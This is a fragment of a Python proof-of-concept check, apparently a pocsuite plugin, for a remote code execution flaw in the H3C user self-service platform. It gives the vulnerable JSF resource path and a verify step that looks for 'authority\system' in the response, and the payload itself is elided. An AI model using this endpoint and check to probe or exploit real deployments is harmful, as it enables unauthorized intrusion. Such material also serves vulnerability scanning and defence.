...
class DemoPOC(POCBase):
    ...
    references =[]
    name ="H3C 用户自助服务平台 RCE漏洞"
    appPowerLink = ''
    appName = 'H3C 用户自助服务平台'
    appVersion = ''
    vulType = 'RCE'
    desc = '''
    ...
    def _verify(self):
        ...
        url = str(urlresult) + '/mselfservice/javax.faces.resource/dynamiccontent.properties.xhtml'
        headers = {
        ...
        try:
            if r.status_code == 200 and 'authority\system' in r.text:
                result['VerifyInfo'] = {}
